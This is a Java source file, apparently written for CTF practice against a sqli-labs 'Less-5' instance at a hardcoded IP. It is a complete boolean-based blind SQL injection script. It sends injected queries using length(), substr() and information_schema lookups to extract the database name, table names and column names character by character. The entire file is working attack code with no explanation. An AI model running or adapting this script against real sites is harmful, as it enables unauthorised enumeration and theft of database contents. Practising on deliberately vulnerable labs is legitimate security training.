package cn.xiaoyes.ctf.sql;

import cn.hutool.http.HttpUtil;

import java.util.*;


/**
 * 盲注脚本
 */
public class BlindNode {
    public static void main(String[] args) {


        final String BASE_URL = "http://39.108.237.243:8866/Less-5/?id=1'";

        String payLoads = "abcdefghijklmnopqrstuvwxyz0123456789";

//        String s = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_!@#$%^&*(),./\\[]+-=:;\"''\"<";


        String flag = "You are in";


        /**
         * 数据库长度
         */
        int dbLen = 0;

        /**
         * 数据库名称
         */
        StringBuilder dbName = new StringBuilder();


        /**
         * 数据表数量
         */
        int tableCount = 0;

        /**
         * 数据表名称以及长度
         * ("sys_user",8)
         * ("sys_config",9)
         */
        Map<String, Integer> tableNameCount = new HashMap<>();


        for (int i = 0; i < 100; i++) {
            String result = HttpUtil.get(BASE_URL + " and (length(database())=" + i + ") --+");
            if (result.contains(flag)) {
                dbLen = i;
                break;
            }
        }
        System.out.println("数据库长度 => " + dbLen);

        for (int i = 1; i <= dbLen; i++) {
            for (int x = 0; x < payLoads.length(); x++) {
                String res = HttpUtil.get(BASE_URL + "and substr(database()," + i + ",1) = '" + payLoads.charAt(x) + "' --+ ");
                if (res.contains(flag)) {
                    dbName.append(payLoads.charAt(x));
                }
            }
        }
        System.out.println("数据库名称 => " + dbName);

        for (int i = 1; i < 50; i++) {
            String res = HttpUtil.get(BASE_URL + "and (select count(table_name) from information_schema.tables where table_schema=database())=" + i + "--+ ");
            if (res.contains(flag)) {
                tableCount = i;
            }
        }
        System.out.println("数据表数量 => " + tableCount);

        System.out.print("数据表 => ");
        for (int i = 0; i < tableCount; i++) {
            int count = 0;
            for (int j = 1; j < 50; j++) {
                String res = HttpUtil.get(BASE_URL + "and length((select table_name from information_schema.tables where table_schema=database() limit " + i + ",1)) = " + j + " --+");
                if (res.contains(flag)) {
                    count = j;
                }
            }
            StringBuilder tableName = new StringBuilder();
            for (int k = 1; k <= count; k++) {
                for (int s = 0; s < payLoads.length(); s++) {
                    String res = HttpUtil.get(BASE_URL + "and substr((select table_name from information_schema.tables where table_schema=database() limit " + i + ",1)," + k + ",1)='" + payLoads.charAt(s) + "' --+");
                    if (res.contains(flag)) {
                        tableName.append(payLoads.charAt(s));
                    }
                }
            }
            System.out.print(tableName + " ");
            tableNameCount.put(tableName.toString(), count);
        }
        Set<String> tableNames = tableNameCount.keySet();
        Iterator<String> iterator = tableNames.iterator();

        while (iterator.hasNext()) {
            String tableName = iterator.next();
            int columnCount = 0;
            for (int i = 1; i < 50; i++) {
                String res = HttpUtil.get(BASE_URL + "and (select count(column_name) from information_schema.columns where table_name = '" + tableName + "' and table_schema='" + dbName + "')=" + i + "--+ ");
                if (res.contains(flag)) {
                    columnCount = i;
                }
            }
            System.out.println("数据列数量 => " + columnCount);

            System.out.print("数据列 => ");
            for (int i = 0; i < columnCount; i++) {
                /* 数据列长度 */
                int count = 0;
                for (int j = 1; j < 50; j++) {
                    String res = HttpUtil.get(BASE_URL + "and length((select column_name from information_schema.columns where table_name = '" + tableName + "' and table_schema='" + dbName + "' limit " + i + ",1)) = " + j + " --+");
                    if (res.contains(flag)) {
                        count = j;
                    }
                }
                /* 数据列名称 */
                StringBuilder sb = new StringBuilder();
                for (int k = 1; k <= count; k++) {
                    for (int s = 0; s < payLoads.length(); s++) {
                        String res = HttpUtil.get(BASE_URL + "and substr((select column_name from information_schema.columns where table_name = '" + tableName + "' and table_schema='" + dbName + "' limit " + i + ",1)," + k + ",1)='" + payLoads.charAt(s) + "' --+");
                        if (res.contains(flag)) {
                            sb.append(payLoads.charAt(s));
                        }
                    }
                }
                System.out.print(sb + " ");
            }
        }
    }
}
